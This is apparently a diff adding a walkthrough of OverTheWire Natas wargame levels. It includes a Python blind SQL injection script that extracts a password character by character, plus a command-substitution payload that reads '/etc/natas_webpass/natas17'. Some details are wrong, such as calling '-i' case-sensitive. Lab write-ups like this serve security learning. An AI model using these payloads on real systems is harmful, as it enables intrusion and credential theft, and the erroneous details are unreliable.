@@ -285,3 +285,98 @@ That **{or "1" = "1"}** part makes the statement true whatever the username and 
 ![alt text](NatasScreenshots/15.2.png)
 
 ![alt text](NatasScreenshots/15.1.png)
+
+# Level 16
+
+Here, it created a table that contains two columns : **username** and **password**. It asks us for the username as an input and checks if it exists in the table and tells us the result. If we blindly type **natas16**, it will state that it exists which is normal since we are seekings its password.
+
+In this level, we can get any hardcoded information. All we can get is a yes or no answer depending on the correctness of our input.
+
+Since it is not sanitizing our input, we can just check for certain characters in the username instead of the whole word like checking if the first letter is **"n"**.
+
+To do so, we can write **{" or substring(username, 1, 1) = 'n' -- }** in the input field and normally it will ouputs a positive response. Don't forget to add space after -- (which stand for commenting everything that follows it) otherwise it won't work.
+
+We can do the same process on **password** column by comparing every letter with all the possible matches and collect the ones that gave positive response. This way, we can craft the password. This approach is called **Blind Injection**.
+
+Let's create a python script to auatomate the job.
+
+```python
+# Import the requests library for making HTTP requests
+import requests
+# Import string for accessing ASCII letters and digits
+import string
+
+# Character set for the password (a-z, A-Z, 0-9)
+charset = string.ascii_letters + string.digits
+# Expected length of the password which is 32 if we follow the patterns of previous passwords
+password_length = 32
+# Initialize empty string to build the password
+password = ""
+
+# Create a session to maintain authentication across requests
+session = requests.Session()
+# Set HTTP Basic Authentication with username and password
+session.auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+
+# Iterate through each count (1 to 32) to build the password substring
+for count in range(1, password_length + 1):
+    # Flag to track if a matching character is found for the current count
+    found = False
+    # Test each character in the charset
+    for char in charset:
+        # Craft the SQL injection payload
+        # Format: " or binary substring(password,1,count)="password + char" --
+        # - binary ensures case-sensitive comparison
+        # - substring(password,1,count) extracts password from 1 to count
+        # - Compares with current password + guessed character
+        # - -- comments out the rest of the query
+        payload = f'" or binary substring(password,1,{count})="{password}{char}" -- '
+        # Create data dictionary for POST request with username parameter as mentioned in source code
+        data = {"username": payload}
+        # Send POST request with the payload
+        response = session.post("http://natas15.natas.labs.overthewire.org/index.php", data=data)
+
+        # Check if the response indicates a successful match
+        if "This user exists" in response.text:
+            # Add the matching character to the password
+            password += char
+            # Print the current count, character, and partial password
+            print(f"Count {count}: {char} (Current: {password})")
+            # Set flag to indicate a match was found
+            found = True
+            # Exit the character loop to move to the next count
+            break
+        else:
+            # Print the character being tried (for debugging progress)
+            print(f"Tried char: {char}")
+
+    # If no character matched, stop the script
+    if not found:
+        print(f"Failed to find character at count {count}. Stopping.")
+        break
+
+# Print the final extracted password
+print(f"Final password: {password}")
+```
+
+**Side Note:** substring is not enough because it is not case-sensitive so we need to use **binary** keyword before it.
+
+Anyway, running this code will provide us the password.
+
+![alt text](NatasScreenshots/16.png)
+
+# Level 17
+
+Here things got difficult. Besides that the input is well sanitized, it is putting it between ' ' in the command so whatever we input it will get converted as a string. But what we can do is taking advantage of **\$** character as it allows us to write bash commands. For instance, \*\$(whoami)** will be converted by the output of the command which is the user name, **\$(echo hello)** will be replaced by the output of echo command which is **hello**. But even so, there is nothing much we can do as, again, whatever command we write, its output will be interpreted as a string to grep it in the **dictionary.txt\*\* file.
+
+One clever solution is based on that when we feed it a blank text, it would return everything in the **dictionary.txt** file. This can be proven by feeding **$(echo )** in the input field which will be converted by an empty **" "** and will output to us a long list of words.
+
+The idea is following the solution of the previous level to blindly guess the password by using **grep** command to check the existance of certain words (which will be automatically constructed from every possible character). If a feeded word exists, the grep command will be converted by the whole word which will be grepped by the original command in **dictionary.txt** and normally it won't find a match and so ouptuts nothing. If the feeded word doesn't exist, the grepp command will ouputs nothing which will eventually outputs everything from **dictionary.txt**.
+
+To test if it works correctly, let's enumarte the existance of numbers in **/etc/natas_webpass/natas17** by the input **$(cat {n} /etc/natas_webpass/natas17)** and changing {n} with numbers from 0 to 9.
+
+For 0, 1 and 2, it outputed nothing but for 3, it outputed everything. So we know that 0, 1 and 2 exists in the password and 3 does not.
+
+To check the existance of the pattern at the start of the word, we use the symbole **^** as **^abc** will retrun every word that starts with **abc**. And we can add **-i** flag for case sensitivity.
+
+Now, let's build a script to automate the search.
